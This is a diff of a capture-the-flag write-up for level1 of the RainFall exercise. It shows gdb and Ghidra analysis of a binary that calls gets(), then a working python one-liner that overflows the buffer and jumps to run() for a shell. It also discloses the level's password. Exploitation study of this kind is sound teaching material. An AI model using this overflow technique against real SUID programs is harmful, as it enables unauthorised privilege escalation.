@@ -1,6 +1,6 @@
 Login as `level1`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.1.75 -p 4242 -l level1
 level1@192.168.1.75's password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
   GCC stack protector support:            Enabled
@@ -30,11 +30,11 @@ Starting program: /home/user/level1/level1
 Breakpoint 1, 0x08048483 in main ()
 (gdb) disassemble
 Dump of assembler code for function main:
-   0x08048480 <+0>:		push   %ebp
-   0x08048481 <+1>:		mov    %esp,%ebp
-=> 0x08048483 <+3>:		and    $0xfffffff0,%esp
-   0x08048486 <+6>:		sub    $0x50,%esp
-   0x08048489 <+9>:		lea    0x10(%esp),%eax
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+=> 0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
    0x0804848d <+13>:	mov    %eax,(%esp)
    0x08048490 <+16>:	call   0x8048340 <gets@plt>
    0x08048495 <+21>:	leave
@@ -111,7 +111,7 @@ Examine memory address `0x8048584` in string format shows which syscall is made.
 $16 = 0x8048584 "/bin/sh"
 ```
 
-By analysing binary with Ghidra, its confirmed that `run()` execute a shell.
+By analyzing binary with Ghidra, its confirmed that `run()` execute a shell.
 ```ghidra
 void run(void)
 {
@@ -167,7 +167,7 @@ Upon this, `run()` is successfully ran, but SUID permission of `level2` are lost
 
 Man of `gets()` mentions BOF vulnerability in SECURITY CONSIDERATIONS section. 
 As ASLR isn't enabled it allows to implement BOF. For it, 
-Cosider memory address of `run()` and allocated space for str buffer.
+Consider memory address of `run()` and allocated space for `str` buffer.
 
 ```gdb
 level1@RainFall:~$ gdb -q ./level1
@@ -204,10 +204,13 @@ Dump of assembler code for function run:
 End of assembler dump.
 (gdb)
 ```
-As actuall Linux system is little endian, the address of `run()` should be reversed.
+As actual Linux system is little endian, the address of `run()` should be reversed.
 ```shell
 level1@RainFall:~$ lscpu | grep Endian
 Byte Order:            Little Endian
+```
+Exploit and log on to the next level.
+```shell
 level1@RainFall:~$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat -) | ./level1
 Good... Wait what?
 whoami
